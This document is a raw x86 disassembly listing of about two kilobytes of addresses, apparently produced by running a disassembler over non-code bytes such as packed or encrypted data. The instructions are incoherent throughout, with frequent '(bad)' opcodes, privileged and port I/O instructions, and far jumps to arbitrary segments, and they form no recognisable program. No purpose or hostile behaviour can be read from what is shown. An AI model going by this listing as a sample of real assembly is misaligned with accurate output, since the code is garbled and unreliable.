  4212d3:	enter  0x9e31,0x10
  4212d7:	hlt    
  4212d8:	shl    BYTE PTR [eax+edx*4-0x68],0x2b
  4212dd:	inc    ecx
  4212de:	push   0x64
  4212e0:	gs dec eax
  4212e2:	xor    ecx,DWORD PTR [eax+0x28de3b59]
  4212e8:	push   edx
  4212e9:	adc    dh,BYTE PTR [ecx+eax*4]
  4212ec:	mov    DWORD PTR [ecx],edx
  4212ee:	(bad)  
  4212ef:	jmp    0xbc222208
  4212f4:	enter  0x72b3,0x7
  4212f8:	outs   dx,BYTE PTR ds:[esi]
  4212f9:	fsubr  QWORD PTR [edi+0x7]
  4212fc:	adc    al,0x65
  4212fe:	aas    
  4212ff:	retf   
  421300:	pusha  
  421301:	ja     0x42133c
  421303:	lock imul ecx,DWORD PTR [ebx+0x0],0x26
  421308:	shr    ch,1
  42130a:	jno    0x421385
  42130c:	cmp    eax,0xece6faf2
  421311:	sub    cl,al
  421313:	addr16 in al,0x1b
  421316:	(bad)  
  421317:	mov    al,ds:0x852c53ca
  42131c:	loope  0x42134d
  42131e:	mov    edi,0xefef0a0e
  421323:	bound  esp,QWORD PTR [edi+ebx*2+0x1c301601]
  42132a:	pop    esi
  42132b:	mov    ds:0xe87c558e,eax
  421330:	(bad)  
  421331:	pop    ebp
  421332:	jp     0x4213ac
  421334:	pop    eax
  421335:	ret    0x169c
  421338:	repnz push cs
  42133a:	mov    edx,0xfbd61e51
  42133f:	xchg   DWORD PTR [eax-0x4b],ebp
  421342:	fwait
  421343:	sbb    al,0xfb
  421345:	nop
  421346:	sti    
  421347:	sub    al,0xa
  421349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42134a:	lds    ebx,FWORD PTR [edx-0x1010b372]
  421350:	retf   0x2209
  421353:	dec    eax
  421354:	icebp  
  421355:	ja     0x421346
  421357:	dec    ebp
  421358:	mov    bl,0x30
  42135a:	test   eax,0x1afbfb86
  42135f:	sub    DWORD PTR [edx],ebx
  421361:	out    0x1f,eax
  421363:	mov    esi,0x1c23d421
  421368:	sbb    al,BYTE PTR [edi+0x24]
  42136b:	mov    edi,0x5f768adc
  421370:	or     bl,BYTE PTR [ebx-0x7028bb1a]
  421376:	ss clc 
  421378:	mov    eax,0x64c65bbb
  42137d:	mov    dh,0xdf
  42137f:	or     dl,cl
  421381:	ds push edi
  421383:	ror    ch,cl
  421385:	sub    dh,dh
  421387:	retf   
  421388:	repnz addr16 mov edx,0xc729276e
  42138f:	and    eax,0xb2fd910a
  421394:	clc    
  421395:	push   ds
  421396:	repz or esp,ecx
  421399:	repz fbld TBYTE PTR es:0x585ce813
  4213a1:	scas   eax,DWORD PTR es:[edi]
  4213a2:	jecxz  0x421341
  4213a4:	mov    eax,0x59f9e612
  4213a9:	jg     0x4213a3
  4213ab:	dec    ecx
  4213ac:	mov    al,0x12
  4213ae:	std    
  4213af:	pop    ebp
  4213b0:	jo     0x4213de
  4213b2:	inc    ebp
  4213b3:	gs jb  0x42136b
  4213b6:	adc    eax,0x5ba4f1f9
  4213bb:	inc    edi
  4213bc:	aam    0xff
  4213be:	aam    0x57
  4213c0:	fisub  WORD PTR [esi]
  4213c2:	cmp    bh,ah
  4213c4:	pop    eax
  4213c5:	(bad)  
  4213c6:	div    BYTE PTR [edx+0x16aa25a2]
  4213cc:	jnp    0x4213bd
  4213ce:	mov    gs,ebx
  4213d0:	popf   
  4213d1:	mov    ch,0x20
  4213d3:	push   esp
  4213d4:	jle    0x4213f2
  4213d6:	adc    ebx,DWORD PTR [ebx+0x34]
  4213d9:	pop    eax
  4213da:	minps  xmm3,XMMWORD PTR [esp+ebx*4-0x5d344487]
  4213e2:	jmp    0x421394
  4213e4:	ja     0x421408
  4213e6:	jmp    0x880d:0xae5edc21
  4213ed:	push   esp
  4213ee:	xchg   esi,eax
  4213ef:	or     dh,BYTE PTR [eax+0x1e36d41]
  4213f5:	test   BYTE PTR [ecx],cl
  4213f7:	sub    DWORD PTR [edx+0x4a9258da],eax
  4213fd:	push   esi
  4213fe:	cmp    eax,DWORD PTR [edx+ebx*1+0x3a]
  421402:	call   0xf2fe:0xb5503b41
  421409:	xor    BYTE PTR [edx-0x409a5f84],bh
  42140f:	push   edx
  421410:	mov    bl,dh
  421412:	in     al,dx
  421413:	shr    BYTE PTR cs:[edi-0x28],1
  421417:	fs push ds
  421419:	mov    dl,0xe3
  42141b:	sbb    al,0x4
  42141d:	popa   
  42141e:	add    al,0x3e
  421420:	add    eax,0x8ad10fe2
  421425:	ret    
  421426:	jge    0x42148f
  421428:	fisttp QWORD PTR [esp+0x46]
  42142c:	int3   
  42142d:	adc    si,cx
  421430:	fidiv  DWORD PTR [edi]
  421432:	xchg   edi,eax
  421433:	dec    ebx
  421434:	fmulp  st(4),st
  421436:	xchg   esi,eax
  421437:	push   cs
  421438:	or     edx,eax
  42143a:	adc    ebx,DWORD PTR [eax+0x6a857b7]
  421440:	pop    edi
  421441:	jg     0x4213c9
  421443:	mov    ch,0xa8
  421445:	inc    ecx
  421446:	inc    ebp
  421447:	sub    al,0x27
  421449:	ss cdq 
  42144b:	cli    
  42144c:	out    dx,al
  42144d:	jns    0x4214a5
  42144f:	sub    DWORD PTR [eax+0x56aca923],esp
  421455:	xlat   BYTE PTR ds:[ebx]
  421456:	xchg   esp,eax
  421457:	xlat   BYTE PTR ds:[ebx]
  421458:	push   ss
  421459:	dec    DWORD PTR [esi+0x71086e38]
  42145f:	fstp   QWORD PTR [edx+0x15]
  421462:	rcl    DWORD PTR [ebx],0x29
  421465:	jge    0x421469
  421467:	sti    
  421468:	mov    edi,0x91311062
  42146d:	rol    DWORD PTR [ecx-0x2d],cl
  421470:	mov    ecx,0x9ce0b099
  421475:	jge    0x421483
  421477:	mov    dl,0x5c
  421479:	or     esp,ecx
  42147b:	loopne 0x421410
  42147d:	repnz or DWORD PTR ds:0x1c850746,0x7d
  421485:	ins    DWORD PTR es:[edi],dx
  421486:	dec    edi
  421487:	xor    DWORD PTR [ebx+0x2f9dcffa],0xb135c15e
  421491:	loop   0x421474
  421493:	cmc    
  421494:	cwde   
  421495:	adc    al,dh
  421497:	pusha  
  421498:	jle    0x42148c
  42149a:	call   0xc4747bd0
  42149f:	fldenv [ebx]
  4214a1:	push   es
  4214a2:	lds    esp,FWORD PTR [ecx]
  4214a4:	xchg   ebx,eax
  4214a5:	push   edx
  4214a6:	adc    DWORD PTR [edx+0x46],ecx
  4214a9:	sar    DWORD PTR [ebx],0x99
  4214ac:	(bad)  
  4214ae:	ja     0x4214fb
  4214b0:	lock aad 0xea
  4214b3:	das    
  4214b4:	mov    eax,0xbf80ca7d
  4214b9:	jg     0x42149a
  4214bb:	mov    bh,0x94
  4214bd:	ins    BYTE PTR es:[edi],dx
  4214be:	clc    
  4214bf:	xor    bl,bh
  4214c1:	add    ch,bl
  4214c3:	dec    edx
  4214c4:	je     0x42153e
  4214c6:	popa   
  4214c7:	push   ebp
  4214c8:	jbe    0x4214bc
  4214ca:	sbb    dh,BYTE PTR [ebx+esi*1-0x44]
  4214ce:	xchg   ebx,eax
  4214cf:	out    0xe6,al
  4214d1:	push   eax
  4214d2:	rcr    DWORD PTR [ecx-0x5b],1
  4214d5:	iret   
  4214d6:	adc    al,0xe0
  4214d8:	(bad)  
  4214d9:	sub    BYTE PTR [esi],cl
  4214db:	bound  edx,QWORD PTR [edi+0x1b]
  4214de:	stc    
  4214df:	and    eax,ebp
  4214e1:	ds sbb ecx,0xffffffa1
  4214e5:	xor    dl,BYTE PTR [edx]
  4214e7:	pop    ds
  4214e8:	push   cs
  4214e9:	(bad)  
  4214eb:	lods   al,BYTE PTR ds:[esi]
  4214ec:	jno    0x4214a8
  4214ee:	xor    eax,0x119c9017
  4214f3:	push   ss
  4214f4:	(bad)  
  4214f5:	lea    ebx,[edi]
  4214f7:	and    eax,DWORD PTR [edx]
  4214f9:	nop
  4214fa:	jge    0x4214ca
  4214fc:	mov    ebx,0x14153d96
  421501:	and    eax,0x26728ab0
  421506:	jge    0x42156b
  421508:	cmp    BYTE PTR [edi+eax*8+0xf80926a],bl
  42150f:	mov    DWORD PTR [ecx],esi
  421511:	call   0x36a:0xdb5d33fc
  421518:	pop    esi
  421519:	aaa    
  42151a:	mov    dh,0xab
  42151c:	ror    ebp,1
  42151e:	push   ss
  42151f:	push   ds
  421520:	sbb    eax,0x2d45943a
  421525:	out    dx,al
  421526:	xchg   esp,eax
  421527:	push   ebx
  421528:	or     eax,0x2124eeb4
  42152d:	or     BYTE PTR [ebx+0x5afd3988],0x22
  421534:	(bad)
  421537:	sub    eax,0x2280005a
  42153c:	icebp  
  42153d:	push   es
  42153e:	mov    cl,0x19
  421540:	inc    esi
  421541:	loop   0x421590
  421543:	cmp    dh,bl
  421545:	xchg   edi,eax
  421546:	cmp    DWORD PTR [ecx-0x7b58cfc2],esp
  42154c:	push   es
  42154d:	inc    esi
  42154e:	cmp    al,0xfb
  421550:	or     eax,DWORD PTR [ecx+ebx*2-0x58be09ce]
  421557:	aam    0xf
  421559:	test   eax,0x3a4438a
  42155e:	test   eax,ecx
  421560:	test   al,ch
  421562:	dec    ebp
  421563:	xor    dl,bl
  421565:	mov    ds:0x7198acad,eax
  42156a:	mov    cl,0xe4
  42156c:	fistp  QWORD PTR [ebx+0x21b21c29]
  421572:	pushf  
  421573:	lds    edx,FWORD PTR [eax+0x7d]
  421576:	repz hlt 
  421578:	cmp    BYTE PTR [ebx],bl
  42157a:	js     0x421591
  42157c:	cmp    eax,0xf77d26b1
  421581:	adc    ch,bl
  421583:	inc    edx
  421584:	cmp    al,0x18
  421586:	outs   dx,DWORD PTR ds:[esi]
  421587:	pushf  
  421588:	push   0xa43f0254
  42158d:	jmp    0xf8c3:0x46a6e44e
  421594:	jno    0x4215b5
  421596:	ja     0x4215d8
  421598:	std    
  421599:	lods   eax,DWORD PTR ds:[esi]
  42159a:	fiadd  DWORD PTR [edx-0x620344c8]
  4215a0:	out    dx,eax
  4215a1:	lods   eax,DWORD PTR ds:[esi]
  4215a2:	repz inc edi
  4215a4:	mov    al,ds:0xa3440499
  4215a9:	mov    ebx,0xec239923
  4215ae:	push   cs
  4215af:	sbb    ch,BYTE PTR [ecx-0x1bfc0e46]
  4215b5:	push   ecx
  4215b6:	enter  0xcc66,0x6d
  4215ba:	sahf   
  4215bb:	fldenv [ecx+eax*4]
  4215be:	dec    ecx
  4215bf:	repz inc eax
  4215c1:	jne    0x421629
  4215c3:	(bad)  
  4215c4:	(bad)  
  4215c5:	lods   eax,DWORD PTR ds:[esi]
  4215c6:	mov    al,ds:0x28cc9a08
  4215cb:	sub    eax,0x3be689fa
  4215d0:	cmc    
  4215d1:	inc    edi
  4215d2:	into   
  4215d3:	icebp  
  4215d4:	shr    DWORD PTR [eax+0x3aa8b90d],cl
  4215da:	pop    esp
  4215db:	int    0xe9
  4215dd:	fdivr  DWORD PTR [ecx+ecx*1+0x51]
  4215e1:	or     BYTE PTR [ecx],bl
  4215e3:	mov    BYTE PTR [eax-0xe9baefb],ah
  4215e9:	in     al,0x74
  4215eb:	dec    eax
  4215ec:	out    0x1a,eax
  4215ee:	push   ebx
  4215ef:	repnz fsub st(0),st
  4215f2:	push   ebx
  4215f3:	iret   
  4215f4:	aad    0x65
  4215f6:	(bad)  
  4215f7:	lock sbb eax,0xc96c97ea
  4215fd:	push   ebx
  4215fe:	pop    ss
  4215ff:	xchg   ebp,eax
  421600:	cmp    eax,0x2d53fd20
  421605:	loop   0x42163e
  421607:	stos   DWORD PTR es:[edi],eax
  421608:	or     al,0x33
  42160a:	bound  ebp,QWORD PTR [ebx+eiz*1+0x17b9f10a]
  421611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421612:	inc    ecx
  421613:	aaa    
  421614:	cmp    DWORD PTR [edi],0xfffffffd
  421617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421618:	sbb    ebp,ecx
  42161a:	jl     0x421694
  42161c:	in     al,dx
  42161d:	add    BYTE PTR [eax+0x6e2dd6ba],ah
  421623:	inc    esp
  421624:	dec    ebx
  421625:	push   eax
  421626:	fld    DWORD PTR [eax+edi*8]
  421629:	add    eax,0xb132a5f0
  42162e:	pop    esp
  42162f:	adc    BYTE PTR [edx+0x7a],ah
  421632:	lahf   
  421633:	adc    al,0x11
  421635:	(bad)  
  421636:	ins    BYTE PTR es:[edi],dx
  421637:	sti    
  421638:	inc    ecx
  421639:	jle    0x4216b6
  42163b:	out    0x23,al
  42163d:	mov    ecx,0xa6ae307e
  421642:	hlt    
  421643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421644:	in     eax,dx
  421645:	ror    BYTE PTR [ecx-0x10],cl
  421648:	test   al,0x6
  42164a:	dec    edx
  42164b:	push   edi
  42164c:	pusha  
  42164d:	jle    0x4215de
  42164f:	sbb    eax,0xb2286319
  421654:	je     0x4216c7
  421656:	pop    esi
  421657:	and    ecx,eax
  421659:	out    0x4d,al
  42165b:	fwait
  42165c:	adc    eax,0x1090260d
  421661:	mov    dl,0xdf
  421663:	stc    
  421664:	xlat   BYTE PTR ds:[ebx]
  421665:	das    
  421666:	mov    ds:0x78f6d49,eax
  42166b:	mov    eax,0x1d839d48
  421670:	xchg   BYTE PTR [esp+eax*1-0x4a513474],cl
  421677:	mov    gs,WORD PTR [ebp+0x6012d847]
  42167d:	not    ebx
  42167f:	fs test al,0x4e
  421682:	ss retf 
  421684:	add    ah,BYTE PTR [esi+0x6d3a82a2]
  42168a:	sar    DWORD PTR [ecx],cl
  42168c:	mov    ecx,0x11607d6f
  421691:	xor    ah,BYTE PTR [ecx-0x1a402d38]
  421697:	repnz cmp DWORD PTR [eax+edi*2],0x2b
  42169c:	lahf   
  42169d:	test   al,bh
  42169f:	adc    ah,BYTE PTR [edi-0x2334a46]
  4216a5:	inc    edx
  4216a6:	mov    bh,0xac
  4216a8:	mov    ebx,0x8bca71cf
  4216ad:	add    eax,0xeb3ab440
  4216b2:	clc    
  4216b3:	xor    BYTE PTR [ebp-0x15acc2f4],dh
  4216b9:	outs   dx,BYTE PTR ds:[esi]
  4216ba:	lock pop edi
  4216bc:	mov    al,0x11
  4216be:	adc    edi,edx
  4216c0:	scas   eax,DWORD PTR es:[edi]
  4216c1:	and    DWORD PTR ds:0xe4af0e71,0xf615f045
  4216cb:	push   0xffffffec
  4216cd:	add    al,0xba
  4216cf:	xchg   esp,eax
  4216d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216d1:	adc    al,0x94
  4216d3:	test   eax,0xd88f30d3
  4216d8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4216da:	ret    0xfa26
  4216dd:	out    dx,al
  4216de:	clc    
  4216df:	adc    esp,ebp
  4216e1:	test   eax,0x5522842
  4216e6:	mov    esi,0xbb726347
  4216eb:	ja     0x421746
  4216ed:	or     eax,0x57df56f8
  4216f2:	lods   al,BYTE PTR ds:[esi]
  4216f3:	aas    
  4216f4:	outs   dx,BYTE PTR ds:[esi]
  4216f5:	mov    eax,0x4b8ac72d
  4216fa:	gs push ecx
  4216fc:	pop    esi
  4216fd:	inc    esi
  4216fe:	sar    BYTE PTR [eax-0x55],0x71
  421702:	mov    bh,0x25
  421704:	pop    sp
  421706:	jle    0x42172f
  421708:	fst    DWORD PTR [edx-0x3eabd432]
  42170e:	(bad)  
  42170f:	jl     0x421695
  421711:	mov    ecx,0x30b41ab0
  421716:	popa   
  421717:	lock stc 
  421719:	sbb    BYTE PTR [edi],dh
  42171b:	push   es
  42171c:	mov    edx,0x3e506235
  421721:	mov    ss,WORD PTR [ecx+eiz*1]
  421724:	cmp    al,0x8c
  421726:	inc    ebx
  421727:	mov    ebp,0xc35c94e2
  42172c:	fcom   QWORD PTR [eax]
  42172e:	adc    BYTE PTR [eax+0xb35a1ca],dh
  421734:	loop   0x4216e9
  421736:	es stos BYTE PTR es:[edi],al
  421738:	xlat   BYTE PTR ds:[ebx]
  421739:	das    
  42173a:	leave  
  42173b:	fnstsw WORD PTR [eax+0x30]
  42173e:	cli    
  42173f:	xchg   esi,eax
  421740:	and    DWORD PTR [edx-0x1bce6dfc],0x4812214
  42174a:	sbb    DWORD PTR ss:[ebx],edi
  42174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42174e:	or     al,0xe
  421750:	and    eax,0x7eeb7bc2
  421755:	pop    es
  421756:	sti    
  421757:	and    eax,0x54a1597c
  42175c:	xchg   ebp,eax
  42175d:	sar    DWORD PTR [ebx+0x322abef9],cl
  421763:	cwde   
  421764:	out    0xe3,eax
  421766:	xchg   edx,eax
  421767:	(bad)  
  421768:	mov    edx,0x928967e3
  42176d:	fnstcw WORD PTR [ebx+ebx*2]
  421770:	imul   edi,DWORD PTR [ecx],0xac530c40
  421776:	lds    ebx,FWORD PTR [ebp+eiz*8-0x36]
  42177a:	mov    ebx,0x2c09b33f
  42177f:	lds    eax,FWORD PTR [edx]
  421781:	push   ss
  421782:	daa    
  421783:	mov    al,ds:0x42d041b
  421788:	or     ah,dl
  42178a:	iret   
  42178b:	(bad)  
  42178c:	cmp    DWORD PTR [edx-0x50],ecx
  42178f:	std    
  421790:	adc    al,0xa3
  421792:	es in  eax,dx
  421794:	in     eax,0xeb
  421796:	ins    BYTE PTR es:[edi],dx
  421797:	mov    ebx,0x3fdd1bda
  42179c:	ins    BYTE PTR es:[edi],dx
  42179d:	and    ebp,DWORD PTR [esi+edi*8+0x64]
  4217a1:	sub    BYTE PTR [esi],cl
  4217a3:	repnz fadd DWORD PTR [esi-0x56]
  4217a7:	jo     0x4217b9
  4217a9:	sbb    eax,0x785185d9
  4217ae:	adc    al,0xb1
  4217b0:	pop    ebx
  4217b1:	sub    BYTE PTR [edi+0x4d],dh
  4217b4:	iret   
  4217b5:	(bad)  
  4217b6:	je     0x4217b2
  4217b8:	mov    eax,0xdd3bc27c
  4217bd:	cmp    BYTE PTR [eax-0x33a0232e],dl
  4217c3:	push   ss
  4217c4:	or     dh,BYTE PTR [eax+0x86f3147]
  4217ca:	in     eax,dx
  4217cb:	dec    eax
  4217cc:	sti    
  4217cd:	xchg   BYTE PTR [eax+0xc],ch
  4217d0:	jb     0x4217f3
  4217d2:	aad    0xbf
  4217d4:	pop    esi
  4217d5:	arpl   WORD PTR [esi+0x5f24acb2],bx
  4217db:	pop    esi
  4217dc:	xor    ah,BYTE PTR [eax+eiz*1+0x7c]
  4217e0:	aam    0xcb
  4217e2:	stc    
  4217e3:	inc    edi
  4217e4:	cli    
  4217e5:	cmp    BYTE PTR [eax-0x5b6143],ah
  4217eb:	push   ebx
  4217ec:	mov    cs,WORD PTR [esi+0x2f]
  4217ef:	imul   eax,ebp,0x6f
  4217f2:	loope  0x42177a
  4217f4:	mov    bl,0x8d
  4217f6:	mov    DWORD PTR [ecx-0x3e],0x8e67ace8
  4217fd:	pop    esp
  4217fe:	jg     0x4217b3
  421800:	shufps xmm2,XMMWORD PTR ds:[ebx-0x6d],0x75
  421806:	out    dx,eax
  421807:	scas   al,BYTE PTR es:[edi]
  421808:	call   0x8068253b
  42180d:	mov    edi,0xf1a040e0
  421812:	mov    ch,0x4d
  421814:	xchg   esi,eax
  421815:	dec    esi
  421816:	push   esi
  421817:	jno    0x421898
  421819:	std    
  42181a:	ret    0x5fc2
  42181d:	dec    edi
  42181e:	xchg   esp,eax
  42181f:	dec    ebp
  421820:	leave  
  421821:	dec    edi
  421822:	(bad)  
  421823:	jno    0x4217d5
  421825:	mov    al,0x5d
  421827:	mov    cl,0xc
  421829:	repz xor BYTE PTR fs:[edi],dh
  42182d:	cdq    
  42182e:	jg     0x421890
  421830:	aam    0xf2
  421832:	sbb    eax,0xa5a7ecde
  421837:	div    ecx
  421839:	pop    esp
  42183a:	jge    0x4217fe
  42183c:	sub    DWORD PTR [edx],ebx
  42183e:	mov    eax,ds:0x73024d8b
  421843:	cwde   
  421844:	leave  
  421845:	sbb    esp,ecx
  421847:	xor    cl,bl
  421849:	lock add al,0x7e
  42184c:	mov    dh,0x89
  42184e:	mov    dh,BYTE PTR [edi-0xf]
  421851:	test   eax,0xc94626b0
  421856:	xor    ecx,0x2d
  421859:	js     0x421849
  42185b:	sar    BYTE PTR [edi-0x52],cl
  42185e:	xchg   ebx,eax
  42185f:	pop    ecx
  421860:	inc    edi
  421861:	scas   eax,DWORD PTR es:[edi]
  421862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421863:	outs   dx,BYTE PTR ds:[esi]
  421864:	mov    edi,0x97c78f74
  421869:	lock imul BYTE PTR [ecx+0x49914369]
  421870:	mul    BYTE PTR [ecx-0x6cb2d03c]
  421876:	inc    esi
  421877:	lahf   
  421878:	xchg   edi,eax
  421879:	jl     0x421814
  42187b:	mov    ecx,0x14aab91
  421880:	pop    eax
  421881:	call   0x566ef842
  421886:	pop    esi
  421887:	(bad)  
  421888:	retf   0x96d2
  42188b:	rol    DWORD PTR [ebp+0x71],0x0
  42188f:	xchg   ebp,eax
  421890:	push   esp
  421891:	sub    ah,BYTE PTR ds:0xba44a4b3
  421897:	add    BYTE PTR [edx],bh
  421899:	cmp    eax,0x42bdb727
  42189e:	std    
  42189f:	add    eax,0xade38068
  4218a4:	jmp    0x8ce7c68e
  4218a9:	sbb    ah,BYTE PTR [bx-0x4]
  4218ad:	nop
  4218ae:	in     eax,dx
  4218af:	cli    
  4218b0:	or     eax,0x50a0f694
  4218b5:	aad    0x51
  4218b7:	arpl   WORD PTR [eax+0x4e],bp
  4218ba:	imul   edi,DWORD PTR [edx],0x30
  4218bd:	jne    0x421887
  4218bf:	xor    DWORD PTR [esi],esp
  4218c1:	div    ecx
  4218c3:	mov    ah,0xd9
  4218c5:	adc    BYTE PTR [eax+0x32cf4148],dl
  4218cb:	cmp    al,0x90
  4218cd:	retf   0x5f03
  4218d0:	fwait
  4218d1:	xchg   esp,eax
  4218d2:	int3   
  4218d3:	mov    al,ds:0xd09e11be
  4218d8:	sub    bh,BYTE PTR [ebp+0xd]
  4218db:	scas   al,BYTE PTR es:[edi]
  4218dc:	sub    al,0xdc
  4218de:	mov    ch,0x23
  4218e0:	into   
  4218e1:	add    al,0x92
  4218e3:	and    eax,0x3ed7ff01
  4218e8:	(bad)  [esi]
  4218ea:	push   ebp
  4218eb:	push   esp
  4218ec:	mov    dh,0x17
  4218ee:	fisttp QWORD PTR [edi]
  4218f0:	xchg   edx,eax
  4218f1:	imul   esi,DWORD PTR [esi-0x3e010a32],0x64
  4218f8:	jbe    0x4218c5
  4218fa:	outs   dx,BYTE PTR ds:[esi]
  4218fb:	shl    ebp,0x81
  4218fe:	sti    
  4218ff:	xlat   BYTE PTR ds:[ebx]
  421900:	sbb    esi,ebx
  421902:	ficom  WORD PTR [ecx-0x77]
  421905:	scas   al,BYTE PTR es:[edi]
  421906:	lock rol esp,1
  421909:	xchg   edi,eax
  42190a:	retf   0x1c33
  42190d:	push   0x8052aba
  421912:	mov    dl,0xe7
  421914:	sbb    DWORD PTR [esi+0x7b2645a4],esp
  42191a:	popf   
  42191b:	add    dh,dl
  42191d:	ds iret 
  42191f:	jmp    0x448e:0x8723325a
  421926:	fidiv  DWORD PTR [ebp-0xf]
  421929:	dec    edx
  42192a:	mov    edx,0x2426affb
  42192f:	stos   BYTE PTR es:[edi],al
  421930:	(bad)  
  421931:	xchg   ebp,eax
  421932:	jg     0x4218f0
  421934:	gs inc esp
  421936:	rol    BYTE PTR [ebx],0x87
  421939:	ss int 0xec
  42193c:	scas   eax,DWORD PTR es:[edi]
  42193d:	repz stc 
  42193f:	loopne 0x42195d
  421941:	mov    eax,ds:0xae5359c4
  421946:	mov    ch,0x61
  421948:	cwde   
  421949:	(bad)  
  42194a:	cs pop ebx
  42194c:	pop    ecx
  42194d:	stc    
  42194e:	pop    ss
  42194f:	sub    al,0x48
  421951:	inc    ecx
  421952:	adc    ebp,ecx
  421954:	sbb    eax,0x37f18f64
  421959:	shl    BYTE PTR [esi+ebp*8],0x7a
  42195d:	stc    
  42195e:	and    edx,ecx
  421960:	jne    0x42195b
  421962:	jb     0x4219ab
  421964:	test   al,0xf0
  421966:	xchg   edi,eax
  421967:	inc    edx
  421968:	test   BYTE PTR [ebp+0x19],al
  42196b:	sub    edx,eax
  42196d:	std    
  42196e:	pop    esi
  42196f:	gs (bad) 
  421971:	lods   al,BYTE PTR ds:[esi]
  421972:	shl    DWORD PTR [edi+0xc],1
  421975:	dec    ebx
  421976:	sub    eax,0xc9f825a9
  42197b:	iret   
  42197c:	push   eax
  42197d:	cmp    DWORD PTR [esi-0x37de6521],edi
  421983:	or     eax,0xea6602d7
  421988:	outs   dx,BYTE PTR ds:[esi]
  421989:	xchg   ebp,eax
  42198a:	add    al,0x27
  42198c:	addr16 leave 
  42198e:	and    eax,0x634fa9a9
  421993:	jg     0x421975
  421995:	xchg   ebx,eax
  421996:	ret    0xaff5
  421999:	scas   eax,DWORD PTR es:[edi]
  42199a:	cwde   
  42199b:	dec    esi
  42199c:	adc    eax,0x899ac814
  4219a1:	mov    eax,0x7a1a441
  4219a6:	xchg   ecx,eax
  4219a7:	or     eax,0x228f747e
  4219ac:	mov    WORD PTR [edi+0x35],fs
  4219af:	jg     0x4219f7
  4219b1:	cmp    eax,0x7212e1d6
  4219b6:	mov    al,ds:0xa66b787
  4219bb:	ror    edx,1
  4219bd:	popf   
  4219be:	repnz push edx
  4219c0:	add    eax,esp
  4219c2:	mov    edx,0x957b2e6b
  4219c7:	cmp    al,0xb6
  4219c9:	push   0x89fadf80
  4219ce:	jne    0x4219df
  4219d0:	les    edi,FWORD PTR [ecx]
  4219d2:	mov    al,ds:0x22e8065
  4219d7:	int    0xda
  4219d9:	test   DWORD PTR [ebp-0x40484af0],edi
  4219df:	(bad)  
  4219e1:	xchg   edi,eax
  4219e2:	jne    0x421a03
  4219e4:	mov    bh,0x69
  4219e6:	add    al,0x9a
  4219e8:	jne    0x421a61
  4219ea:	rol    BYTE PTR [ebx-0x7f],cl
  4219ed:	push   ss
  4219ee:	sbb    edi,DWORD PTR [ecx]
  4219f0:	sti    
  4219f1:	int    0x2b
  4219f3:	fmulp  st(1),st
  4219f5:	xchg   BYTE PTR [edx],bh
  4219f7:	mov    dl,0x8f
  4219f9:	repz jno 0x421a25
  4219fc:	jae    0x421a4c
  4219fe:	xchg   ebp,eax
  4219ff:	cmp    cl,ah
  421a01:	mov    eax,0xfa54762e
  421a06:	push   ss
  421a07:	pop    edx
  421a08:	jae    0x4219d1
  421a0a:	pop    es
  421a0b:	jle    0x421a16
  421a0d:	mov    bl,0x95
  421a0f:	adc    BYTE PTR [eax+0x3c],cl
  421a12:	mov    dh,0x42
  421a14:	icebp  
  421a15:	sub    DWORD PTR [edi-0x54],ecx
  421a18:	repnz cmp bh,BYTE PTR [eax+0x7b65e41]
  421a1f:	fild   WORD PTR [esi-0x5e]
  421a22:	sub    BYTE PTR [ecx+0x5d8d62f8],al
  421a28:	cmp    dl,BYTE PTR [ecx]
  421a2a:	add    DWORD PTR [bx],edx
  421a2d:	cmp    cl,BYTE PTR [esi]
  421a2f:	inc    esp
  421a30:	or     eax,0x612464a6
  421a35:	loop   0x421a57
  421a37:	jecxz  0x421a43
  421a39:	pop    esi
  421a3a:	cdq    
  421a3b:	and    eax,0x11f9dabd
  421a40:	mov    dl,0xe0
  421a42:	dec    ebx
  421a43:	cld    
  421a44:	js     0x421a34
  421a46:	jp     0x421ac7
  421a48:	std    
  421a49:	inc    ebx
  421a4a:	bound  ecx,QWORD PTR [esi]
  421a4c:	or     BYTE PTR [edx+0x62],bl
  421a4f:	shr    BYTE PTR [eax],1
  421a51:	xor    ebx,DWORD PTR [ebx]
  421a53:	lahf   
  421a54:	inc    eax
  421a55:	in     eax,dx
  421a56:	hlt    
  421a57:	push   ss
  421a58:	call   0x8ff99f68
  421a5d:	sub    al,0x5a
  421a5f:	mov    edi,0xaf2070d
  421a64:	xchg   edi,eax
  421a65:	push   esi
  421a66:	js     0x421a21
  421a68:	(bad)  
  421a69:	mov    ds:0xd55cee0b,eax
  421a6e:	cli    
  421a6f:	stc    
  421a70:	sub    BYTE PTR [esi+0x566a6cea],al
  421a76:	js     0x421a30
  421a78:	jae    0x421aec
  421a7a:	aas    
  421a7b:	fld    DWORD PTR [esi+0x14]
  421a7e:	enter  0xb6a9,0x22
  421a82:	or     bh,BYTE PTR [esi+0x5b]
  421a85:	add    eax,0xc19ac9e6
  421a8a:	arpl   si,sp
  421a8c:	hlt    
  421a8d:	inc    ecx
  421a8e:	loopne 0x421adb
  421a90:	adc    dh,BYTE PTR [ebx+0x39]
  421a93:	adc    eax,0xabec081c
  421a98:	xchg   esp,eax
  421a99:	leave  
  421a9a:	aam    0xb8
  421a9c:	dec    esp
  421a9d:	mov    ah,0xd9
  421a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aa0:	sub    al,0x88
  421aa2:	lods   al,BYTE PTR ds:[esi]
  421aa3:	push   ecx
  421aa4:	in     eax,0xf6
  421aa6:	inc    esp
  421aa7:	popf   
  421aa8:	xchg   edx,eax
  421aa9:	add    ch,BYTE PTR [eax+ecx*4]
  421aac:	and    al,0x61
  421aae:	inc    ebp
  421aaf:	pop    edi
  421ab0:	sub    ecx,edi
  421ab2:	or     DWORD PTR [ebx+0x70],esi
  421ab5:	pop    ebx
  421ab6:	sub    al,0x5f
  421ab8:	or     DWORD PTR [ebp-0x5],0xffffff88
  421abc:	scas   eax,DWORD PTR es:[edi]
  421abd:	pop    ds
  421abe:	(bad)  
  421abf:	mov    ah,0xe4
  421ac1:	cli    
  421ac2:	push   cs
  421ac3:	fwait
  421ac4:	and    al,0x87
  421ac6:	js     0x421a5a
  421ac8:	cld    
